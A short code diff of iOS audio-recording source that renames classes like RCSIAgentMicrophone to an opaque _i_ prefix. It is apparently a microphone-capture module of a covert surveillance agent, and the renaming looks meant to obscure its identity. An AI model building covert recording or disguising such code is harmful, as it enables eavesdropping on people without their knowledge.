@@ -16,8 +16,7 @@ static int gFileCounter   = 0;
 static int gThreadCounter = 0;
 static NSLock *recorderLock;
 
-@implementation RCSIAgentMicrophone
-
+@implementation _i_AgentMicrophone
 @synthesize mRecorder;
 @synthesize mIsRunning;
 @synthesize mPlaybackWasInterrupted;
@@ -109,7 +108,7 @@ char *OSTypeToStr (char *buf, OSType t)
 void interruptionListener2(	void *	inClientData,
                            UInt32	inInterruptionState)
 {
-	RCSIAgentMicrophone *THIS = (RCSIAgentMicrophone *)inClientData;
+	_i_AgentMicrophone *THIS = (_i_AgentMicrophone *)inClientData;
 	if (inInterruptionState == kAudioSessionBeginInterruption)
     {
       if (THIS->mRecorder->IsRunning()) {
@@ -123,7 +122,7 @@ void propListener2 (void                    *inClientData,
                     UInt32                  inDataSize,
                     const void              *inData)
 {
-	RCSIAgentMicrophone *THIS = (RCSIAgentMicrophone *)inClientData;
+	_i_AgentMicrophone *THIS = (_i_AgentMicrophone *)inClientData;
 
 	if (inID == kAudioSessionProperty_AudioRouteChange)
     {
@@ -146,7 +145,7 @@ void propListener2 (void                    *inClientData,
 - (void)setupAudioQueue
 {
   // Allocate our singleton instance for the recorder & player object
-  mRecorder = new RCSIMicrophoneRecorder();
+  mRecorder = new _i_MicrophoneRecorder();
   
   OSStatus error = AudioSessionInitialize(NULL, NULL, interruptionListener2, self);
   
